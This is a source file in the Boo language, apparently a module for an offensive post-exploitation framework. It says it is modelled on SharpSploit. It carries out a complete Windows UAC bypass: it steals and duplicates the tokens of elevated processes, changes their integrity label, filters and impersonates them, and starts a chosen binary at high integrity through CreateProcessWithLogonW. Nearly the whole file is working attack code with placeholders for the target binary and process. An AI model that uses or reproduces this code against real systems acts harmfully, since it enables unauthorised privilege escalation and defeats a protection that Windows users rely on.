/*
    This module is inspired from SharpSploit (https://github.com/cobbr/SharpSploit)
*/
import System
import System.ComponentModel
import System.Diagnostics
import System.Runtime.InteropServices
import System.Security.Principal
import Microsoft.Win32


public enum TOKEN_TYPE:
    TokenPrimary = 1
    TokenImpersonation


public enum _TOKEN_ELEVATION_TYPE:
    TokenElevationTypeDefault = 1
    TokenElevationTypeFull
    TokenElevationTypeLimited


public enum _SECURITY_IMPERSONATION_LEVEL:
    SecurityAnonymous
    SecurityIdentification
    SecurityImpersonation
    SecurityDelegation


public enum ProcessAccessFlags :
    PROCESS_ALL_ACCESS = 0x001F0FFF
    PROCESS_CREATE_PROCESS = 0x0080
    PROCESS_CREATE_THREAD = 0x0002
    PROCESS_DUP_HANDLE = 0x0040
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    PROCESS_SET_INFORMATION = 0x0200
    PROCESS_SET_QUOTA = 0x0100
    PROCESS_SUSPEND_RESUME = 0x0800
    PROCESS_TERMINATE = 0x0001
    PROCESS_VM_OPERATION = 0x0008
    PROCESS_VM_READ = 0x0010
    PROCESS_VM_WRITE = 0x0020
    SYNCHRONIZE = 0x00100000


public enum _TOKEN_INFORMATION_CLASS:
    TokenUser = 1
    TokenGroups
    TokenPrivileges
    TokenOwner
    TokenPrimaryGroup
    TokenDefaultDacl
    TokenSource
    TokenType
    TokenImpersonationLevel
    TokenStatistics
    TokenRestrictedSids
    TokenSessionId
    TokenGroupsAndPrivileges
    TokenSessionReference
    TokenSandBoxInert
    TokenAuditPolicy
    TokenOrigin
    TokenElevationType
    TokenLinkedToken
    TokenElevation
    TokenHasRestrictions
    TokenAccessInformation
    TokenVirtualizationAllowed
    TokenVirtualizationEnabled
    TokenIntegrityLevel
    TokenUIAccess
    TokenMandatoryPolicy
    TokenLogonSid
    TokenIsAppContainer
    TokenCapabilities
    TokenAppContainerSid
    TokenAppContainerNumber
    TokenUserClaimAttributes
    TokenDeviceClaimAttributes
    TokenRestrictedUserClaimAttributes
    TokenRestrictedDeviceClaimAttributes
    TokenDeviceGroups
    TokenRestrictedDeviceGroups
    TokenSecurityAttributes
    TokenIsRestricted
    MaxTokenInfoClass


public enum ACCESS_MASK :
    DELETE = 0x00010000
    READ_CONTROL = 0x00020000
    WRITE_DAC = 0x00040000
    WRITE_OWNER = 0x00080000
    SYNCHRONIZE = 0x00100000
    STANDARD_RIGHTS_REQUIRED = 0x000F0000
    STANDARD_RIGHTS_READ = 0x00020000
    STANDARD_RIGHTS_WRITE = 0x00020000
    STANDARD_RIGHTS_EXECUTE = 0x00020000
    STANDARD_RIGHTS_ALL = 0x001F0000
    SPECIFIC_RIGHTS_ALL = 0x0000FFF
    ACCESS_SYSTEM_SECURITY = 0x01000000
    MAXIMUM_ALLOWED = 0x02000000
    GENERIC_READ = 0x80000000
    GENERIC_WRITE = 0x40000000
    GENERIC_EXECUTE = 0x20000000
    GENERIC_ALL = 0x10000000
    DESKTOP_READOBJECTS = 0x00000001
    DESKTOP_CREATEWINDOW = 0x00000002
    DESKTOP_CREATEMENU = 0x00000004
    DESKTOP_HOOKCONTROL = 0x00000008
    DESKTOP_JOURNALRECORD = 0x00000010
    DESKTOP_JOURNALPLAYBACK = 0x00000020
    DESKTOP_ENUMERATE = 0x00000040
    DESKTOP_WRITEOBJECTS = 0x00000080
    DESKTOP_SWITCHDESKTOP = 0x00000100
    WINSTA_ENUMDESKTOPS = 0x00000001
    WINSTA_READATTRIBUTES = 0x00000002
    WINSTA_ACCESSCLIPBOARD = 0x00000004
    WINSTA_CREATEDESKTOP = 0x00000008
    WINSTA_WRITEATTRIBUTES = 0x00000010
    WINSTA_ACCESSGLOBALATOMS = 0x00000020
    WINSTA_EXITWINDOWS = 0x00000040
    WINSTA_ENUMERATE = 0x00000100
    WINSTA_READSCREEN = 0x00000200
    WINSTA_ALL_ACCESS = 0x0000037F


[StructLayout(LayoutKind.Sequential)]
public struct _SECURITY_ATTRIBUTES:
    nLength as UInt32
    lpSecurityDescriptor as IntPtr
    bInheritHandle as Boolean


[StructLayout(LayoutKind.Sequential)]
public struct _SID_IDENTIFIER_AUTHORITY:
    [MarshalAs(UnmanagedType.ByValArray, SizeConst: 6, ArraySubType: UnmanagedType.I1)]
    public Value as (byte)


[StructLayout(LayoutKind.Sequential)]
public struct _SID_AND_ATTRIBUTES:
    public Sid as IntPtr
    public Attributes as UInt32


[StructLayout(LayoutKind.Sequential)]
public struct _TOKEN_MANDATORY_LABEL:
    public Label as _SID_AND_ATTRIBUTES


[StructLayout(LayoutKind.Sequential)]
public struct _STARTUPINFO:
    public cb as UInt32
    public lpReserved as string
    public lpDesktop as string
    public lpTitle as string
    public dwX as UInt32
    public dwY as UInt32
    public dwXSize as UInt32
    public dwYSize as UInt32
    public dwXCountChars as UInt32
    public dwYCountChars as UInt32
    public dwFillAttribute as UInt32
    public dwFlags as UInt32
    public wShowWindow as UInt16
    public cbReserved2 as UInt16
    public lpReserved2 as IntPtr
    public hStdInput as IntPtr
    public hStdOutput as IntPtr
    public hStdError as IntPtr


[StructLayout(LayoutKind.Sequential)]
public struct _PROCESS_INFORMATION:
    public hProcess as IntPtr
    public hThread as IntPtr
    public dwProcessId as UInt32
    public dwThreadId as UInt32


[StructLayout(LayoutKind.Sequential)]
public struct _LUID:
    public LowPart as UInt32
    public HighPart as UInt32


[StructLayout(LayoutKind.Sequential)]
public struct _TOKEN_STATISTICS:
    public TokenId as _LUID
    public AuthenticationId as _LUID
    public ExpirationTime as UInt64
    public TokenType as TOKEN_TYPE
    public ImpersonationLevel as _SECURITY_IMPERSONATION_LEVEL
    public DynamicCharged as UInt32
    public DynamicAvailable as UInt32
    public GroupCount as UInt32
    public PrivilegeCount as UInt32
    public ModifiedId as _LUID


[DllImport("kernel32.dll")]
public static def OpenProcessToken(
    hProcess as IntPtr,
    dwDesiredAccess as UInt32,
    ref hToken as IntPtr
) as bool:
    pass


[DllImport("kernel32.dll")]
public static def OpenProcess(
    dwDesiredAccess as ProcessAccessFlags,
    bInheritHandle as bool,
    dwProcessId as UInt32
) as IntPtr:
    pass


[DllImport("kernel32.dll")]
public static def CloseHandle(
    hProcess as IntPtr
) as bool:
    pass


[DllImport("advapi32.dll", SetLastError: true)]
public static def GetTokenInformation(
    TokenHandle as IntPtr,
    TokenInformationClass as _TOKEN_INFORMATION_CLASS,
    TokenInformation as IntPtr,
    TokenInformationLength as UInt32 ,
    ref ReturnLength as UInt32
) as bool:
    pass


[DllImport("advapi32.dll", SetLastError: true)]
public static def GetTokenInformation(
    TokenHandle as IntPtr,
    TokenInformationClass as _TOKEN_INFORMATION_CLASS,
    ref TokenInformation as _TOKEN_STATISTICS,
    TokenInformationLength as UInt32 ,
    ref ReturnLength as UInt32
) as bool:
    pass


[DllImport("advapi32.dll", SetLastError: true)]
public static def DuplicateTokenEx(
    hExistingToken as IntPtr,
    dwDesiredAccess as UInt32,
    ref lpTokenAttributes as _SECURITY_ATTRIBUTES,
    ImpersonationLevel as _SECURITY_IMPERSONATION_LEVEL,
    TokenType as TOKEN_TYPE,
    ref phNewToken as IntPtr
) as bool:
    pass


[DllImport("advapi32.dll", SetLastError: true)]
public static def AllocateAndInitializeSid(
    ref pIdentifierAuthority as _SID_IDENTIFIER_AUTHORITY,
    nSubAuthorityCount as byte,
    dwSubAuthority0 as Int32,
    dwSubAuthority1 as Int32,
    dwSubAuthority2 as Int32,
    dwSubAuthority3 as Int32,
    dwSubAuthority4 as Int32,
    dwSubAuthority5 as Int32,
    dwSubAuthority6 as Int32,
    dwSubAuthority7 as Int32,
    ref pSid as IntPtr
) as bool:
    pass


[DllImport("ntdll.dll", SetLastError: true)]
public static def NtSetInformationToken(
    TokenHandle as IntPtr,
    TokenInformationClass as Int32,
    ref TokenInformation as _TOKEN_MANDATORY_LABEL,
    TokenInformationLength as Int32
) as Int32:
    pass


[DllImport("ntdll.dll", SetLastError: true)]
public static def NtFilterToken(
    TokenHandle as IntPtr,
    Flags as UInt32,
    SidsToDisable as IntPtr,
    PrivilegesToDelete as IntPtr,
    RestrictedSids as IntPtr,
    ref hToken as IntPtr
) as int :
    pass


[DllImport("advapi32.dll", SetLastError: true)]
public static def ImpersonateLoggedOnUser(
    hToken as IntPtr
) as bool:
    pass


[DllImport("advapi32.dll", SetLastError: true, CharSet: CharSet.Unicode)]
public static def CreateProcessWithLogonW(
    userName as string,
    domain as string,
    password as string,
    logonFlags as int,
    applicationName as string,
    commandLine as string,
    creationFlags as int,
    environment as IntPtr,
    currentDirectory as string,
    ref startupInfo as _STARTUPINFO,
    ref processInformation as _PROCESS_INFORMATION
) as bool:
    pass


[DllImport("advapi32.dll", SetLastError: true)]
public static def RevertToSelf() as bool:
    pass


public static def IsHighIntegrity() as bool:
    identity = WindowsIdentity.GetCurrent()
    principal = WindowsPrincipal(identity)
    return principal.IsInRole(WindowsBuiltInRole.Administrator)


public static def isAdmin() as bool:
    identity as WindowsIdentity = WindowsIdentity.GetCurrent()
    if (identity != null):
        principal as WindowsPrincipal = WindowsPrincipal(identity)
        list = principal.UserClaims
        for c in list:
            if c.Value.Contains("S-1-5-32-544"):
                return true
    return false


public def TokenIsElevated(hToken as IntPtr) as bool:
    tokenInformationLength as UInt32
    tokenInformation as IntPtr
    returnLength as UInt32
    result as bool
    tiv as _TOKEN_ELEVATION_TYPE

    tokenInformationLength = Marshal.SizeOf(typeof(UInt32))
    tokenInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UInt32)))
    result = GetTokenInformation(
        hToken,
        _TOKEN_INFORMATION_CLASS.TokenElevationType,
        tokenInformation,
        tokenInformationLength,
        returnLength
    )
    tiv = Marshal.ReadInt32(tokenInformation)
    if tiv == _TOKEN_ELEVATION_TYPE.TokenElevationTypeDefault:
        return false
    elif tiv == _TOKEN_ELEVATION_TYPE.TokenElevationTypeFull:
        return true
    elif tiv == _TOKEN_ELEVATION_TYPE.TokenElevationTypeLimited:
        return false
    else:
        return true


public def GetElevatedProcessTokens() as List:
    result as List = []
    IsElevated as bool
    hProcessToken as IntPtr
    hProcess as IntPtr
    elevatedProcess as Process
    Processes = Process.GetProcesses()
    for P in Processes:
        hProcess = OpenProcess(ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, true, P.Id cast UInt32)
        if (hProcess != IntPtr.Zero):
            if (OpenProcessToken(hProcess, ACCESS_MASK.MAXIMUM_ALLOWED cast UInt32, hProcessToken)):
                CloseHandle(hProcess)
                dwLength as UInt32 = 0
                tokenStatistics as _TOKEN_STATISTICS
                TokenType = tokenStatistics.TokenType
                if (not GetTokenInformation(hProcessToken, _TOKEN_INFORMATION_CLASS.TokenStatistics, tokenStatistics, dwLength, dwLength)):
                    if (GetTokenInformation(hProcessToken, _TOKEN_INFORMATION_CLASS.TokenStatistics, tokenStatistics, dwLength, dwLength)):
                        IsElevated = TokenIsElevated(hProcessToken)
                        CloseHandle(hProcessToken)
                        if IsElevated:
                            result.Add(P)
    return result


public static def BypassUAC(binary as string, arguments as string, path as string, processId as int):
    STANDARD_RIGHTS_REQUIRED as UInt32 = 0x000F0000
    STANDARD_RIGHTS_READ as UInt32 = 0x00020000
    TOKEN_ASSIGN_PRIMARY as UInt32 = 0x0001
    TOKEN_DUPLICATE as UInt32 = 0x0002
    TOKEN_IMPERSONATE as UInt32 = 0x0004
    TOKEN_QUERY as UInt32 = 0x0008
    TOKEN_QUERY_SOURCE as UInt32 = 0x0010
    TOKEN_ADJUST_PRIVILEGES as UInt32 = 0x0020
    TOKEN_ADJUST_GROUPS as UInt32 = 0x0040
    TOKEN_ADJUST_DEFAULT as UInt32 = 0x0080
    TOKEN_ADJUST_SESSIONID as UInt32 = 0x0100
    TOKEN_READ as UInt32 = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
    TOKEN_ALL_ACCESS as UInt32 = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
        TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
        TOKEN_ADJUST_SESSIONID)
    TOKEN_ALT as UInt32 = (TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY)
    SE_GROUP_INTEGRITY_32 as UInt32 = 0x00000020

    Username as string = WindowsIdentity.GetCurrent().Name
    processes as List = []
    if processId == 0:
        processes = GetElevatedProcessTokens()
    else:
        processes.Add(Process.GetProcessById(processId))

    print "Number of elevated processes to try: " + processes.Count
    for process as Process in processes:
        // Get PrimaryToken
        hProcess as IntPtr = OpenProcess(ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, false, process.Id cast UInt32)
        if (hProcess == IntPtr.Zero):
            print "OpenProcess() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
            continue

        hProcessToken as IntPtr = IntPtr.Zero
        if (not OpenProcessToken(hProcess, ACCESS_MASK.MAXIMUM_ALLOWED cast UInt32, hProcessToken)):
            print "OpenProcessToken() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
            continue
        CloseHandle(hProcess)

        securityAttributes as _SECURITY_ATTRIBUTES
        hDuplicateToken as IntPtr = IntPtr.Zero
        if (not DuplicateTokenEx(
               hProcessToken,
               TOKEN_ALL_ACCESS cast UInt32,
               securityAttributes,
               _SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
               TOKEN_TYPE.TokenPrimary,
               hDuplicateToken)
           ):
            print "DuplicateTokenEx() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
            continue
        CloseHandle(hProcessToken)

        // SetTokenInformation
        pIdentifierAuthority as _SID_IDENTIFIER_AUTHORITY
        pIdentifierAuthority.Value = array(byte, (0x0, 0x0, 0x0, 0x0, 0x0, 0x10))
        nSubAuthorityCount as byte = 1
        pSid as IntPtr
        if (not AllocateAndInitializeSid(pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, pSid)):
            print "AllocateAndInitializeSid() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
            continue

        sidAndAttributes as _SID_AND_ATTRIBUTES
        sidAndAttributes.Sid = pSid
        sidAndAttributes.Attributes = SE_GROUP_INTEGRITY_32

        tokenMandatoryLevel as _TOKEN_MANDATORY_LABEL
        tokenMandatoryLevel.Label = sidAndAttributes
        tokenMandatoryLabelSize as Int32
        tokenMandatoryLabelSize = Marshal.SizeOf(tokenMandatoryLevel)

        if (NtSetInformationToken(hDuplicateToken, 25, tokenMandatoryLevel, tokenMandatoryLabelSize * 2) != 0):
            print "NtSetInformationToken() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
            continue

        hFilteredToken as IntPtr = IntPtr.Zero
        if (NtFilterToken(hDuplicateToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, hFilteredToken) != 0):
            print "NtFilterToken() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
            continue
        CloseHandle(hDuplicateToken)

        // ImpersonateUser
        securityAttributes2 as _SECURITY_ATTRIBUTES
        hDuplicateToken2 as IntPtr = IntPtr.Zero
        if (not DuplicateTokenEx(
               hFilteredToken,
               (TOKEN_IMPERSONATE | TOKEN_QUERY) cast UInt32,
               securityAttributes2,
               _SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
               TOKEN_TYPE.TokenImpersonation,
               hDuplicateToken2)
           ):
            print "DuplicateTokenEx() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
            continue
        CloseHandle(hFilteredToken)

        if (not ImpersonateLoggedOnUser(hDuplicateToken2)):
            print "ImpersonateLoggedOnUser() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
            continue

        startupInfo as _STARTUPINFO
        startupInfo.cb = Marshal.SizeOf(typeof(_STARTUPINFO))
        processInformation as _PROCESS_INFORMATION
        if (not CreateProcessWithLogonW(Environment.UserName, Environment.UserDomainName, "password",
            0x00000002, path + binary, path + binary + " " + arguments, 0x04000000, IntPtr.Zero, path, startupInfo, processInformation)):
            print "CreateProcessWithLogonW() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
            RevertToSelf()
            continue

        if RevertToSelf():
            print "Successfully executed: \"" + path + binary + " " + arguments + "\" with high integrity."
            return
    print "Failed to execute with high integrity."



public static def Main():
    binary = "BINARY"
    arguments = "ARGUMENTS"
    path = `PATH`
    processId = PROCESS_ID

    if IsHighIntegrity():
        print "[+] Already running in high integrity, no need to bypass UAC."
    elif isAdmin():
        print "[*] In medium integrity but user is a local administrator - UAC can be bypassed."
        BypassUAC(binary, arguments, path, processId)
    else:
        print "[+] Current user is not local administrator."
